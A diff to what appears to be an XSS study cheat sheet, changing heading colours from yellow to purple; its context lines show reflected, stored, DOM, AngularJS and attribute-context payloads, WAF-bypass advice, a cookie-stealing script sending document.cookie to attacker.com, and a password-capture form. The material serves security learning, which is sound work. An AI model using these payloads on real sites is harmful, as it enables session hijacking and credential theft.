@@ -31,7 +31,7 @@ function unsafe(t) {
 
 </details>
 
-## <mark style="color:yellow;">**Reflected XSS**</mark>
+## <mark style="color:purple;">**Reflected XSS**</mark>
 
 The malicious script comes from the current HTTP request.
 
@@ -39,7 +39,7 @@ The malicious script comes from the current HTTP request.
 https://insecure-website.com/search?term=<script>alert(document.domain)</script>
 ```
 
-## <mark style="color:yellow;">**Stored XSS**</mark>
+## <mark style="color:purple;">**Stored XSS**</mark>
 
 The malicious script comes from the website's database. POST body example:&#x20;
 
@@ -47,7 +47,7 @@ The malicious script comes from the website's database. POST body example:&#x20;
 comment=<script>alert(document.domain)</script>
 ```
 
-## <mark style="color:yellow;">**DOM-based XSS**</mark>
+## <mark style="color:purple;">**DOM-based XSS**</mark>
 
 The vulnerability exists in client-side code rather than server-side code.
 
@@ -85,7 +85,7 @@ https://insecure-website.com/index?search="><script>alert(document.domain)</scri
 2. DOM Invader (Burp Suite tool) is a browser-based tool that helps you test for DOM XSS vulnerabilities using a variety of sources and sinks.
 {% endhint %}
 
-### <mark style="color:yellow;">DOM-based web message</mark> <a href="#what-is-the-impact-of-dom-based-web-message-vulnerabilities" id="what-is-the-impact-of-dom-based-web-message-vulnerabilities"></a>
+### <mark style="color:purple;">DOM-based web message</mark> <a href="#what-is-the-impact-of-dom-based-web-message-vulnerabilities" id="what-is-the-impact-of-dom-based-web-message-vulnerabilities"></a>
 
 ```html
 <!-- Vulnerable website -->
@@ -102,7 +102,7 @@ Exploit
 <iframe src=https://vuln.website/ onload='this.contentWindow.postMessage("<img src=1 onerror=print()>","*")'>
 ```
 
-### <mark style="color:yellow;">**jQuery**</mark>
+### <mark style="color:purple;">**jQuery**</mark>
 
 jQuery's `attr()` function can change the attributes of DOM elements
 
@@ -140,7 +140,7 @@ Exploit
 **Note**: Recent versions of jQuery have patched this specific vulnerability by preventing HTML injection into a selector if the input begins with a hash (#). But remember, this is just an example, the real problem is how `$()` selector works .
 {% endhint %}
 
-### <mark style="color:yellow;">AngularJS</mark>
+### <mark style="color:purple;">AngularJS</mark>
 
 When a site uses the `ng-app` attribute on an HTML element, AngularJS processes it and executes JavaScript inside double curly braces `{{ }}` in HTML or attributes.
 
@@ -187,7 +187,7 @@ https://example.comnet/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%2
 </body>
 ```
 
-### <mark style="color:yellow;">Reflected/Stored DOM XSS</mark>
+### <mark style="color:purple;">Reflected/Stored DOM XSS</mark>
 
 If a script reads data from a URL and writes it to a dangerous sink, the vulnerability is client-side with no server processing.
 
@@ -203,9 +203,9 @@ eval('var data = "reflected string"');
 element.innerHTML = comment.author
 ```
 
-## <mark style="color:yellow;">XSS contexts</mark>
+## <mark style="color:purple;">XSS contexts</mark>
 
-### <mark style="color:yellow;">Between HTML tags</mark>
+### <mark style="color:purple;">Between HTML tags</mark>
 
 ```html
 <script>alert(document.domain)</script>
@@ -218,7 +218,7 @@ element.innerHTML = comment.author
 * `<body onresize="print()">` with this payload (for reflected XSS) you need an exploit server and iframe tag
 {% endhint %}
 
-### <mark style="color:yellow;">In HTML tag attributes</mark>
+### <mark style="color:purple;">In HTML tag attributes</mark>
 
 * Terminate the attribute value, close the tag, and introduce a new one.
 
@@ -263,7 +263,7 @@ element.innerHTML = comment.author
 <link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
 ```
 
-### <mark style="color:yellow;">Into JavaScript</mark>
+### <mark style="color:purple;">Into JavaScript</mark>
 
 **Terminating the existing script**
 
@@ -319,13 +319,13 @@ var input = `controllable data here`;
 ${alert(document.domain)}
 ```
 
-## <mark style="color:yellow;">**Bypass WAF**</mark>
+## <mark style="color:purple;">**Bypass WAF**</mark>
 
 If you receive an error like "tag is not allowed" or "event is not allowed", use XSS cheat sheet ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) to discover a tag and event that work.
 
-## <mark style="color:yellow;">Exploitation</mark>
+## <mark style="color:purple;">Exploitation</mark>
 
-### &#x20;<mark style="color:yellow;">S</mark><mark style="color:yellow;">**teal cookies**</mark>
+### &#x20;<mark style="color:purple;">S</mark><mark style="color:purple;">**teal cookies**</mark>
 
 <pre class="language-html"><code class="lang-html"><strong>&#x3C;script>fetch('//attacker.com?'+document.cookie)&#x3C;/script>
 </strong>&#x3C;!-- or -->
@@ -349,7 +349,7 @@ Limitation:
 * Sessions might be locked to additional factors like the user's IP address.
 * The session might time out before you're able to hijack it.
 
-### <mark style="color:yellow;">**Capture passwords**</mark>
+### <mark style="color:purple;">**Capture passwords**</mark>
 
 ```html
 <input name=username id=username>
@@ -360,12 +360,12 @@ body:username.value+':'+this.value
 });">
 ```
 
-### <mark style="color:yellow;">**Perform CSRF**</mark>
+### <mark style="color:purple;">**Perform CSRF**</mark>
 
 * When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.
 * If the site use a token you can get it doing a first request and then add the token in a second request
 
-## <mark style="color:yellow;">Content security policy</mark>
+## <mark style="color:purple;">Content security policy</mark>
 
 CSP restrict the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. CSP defends against XSS attacks in the following ways
 
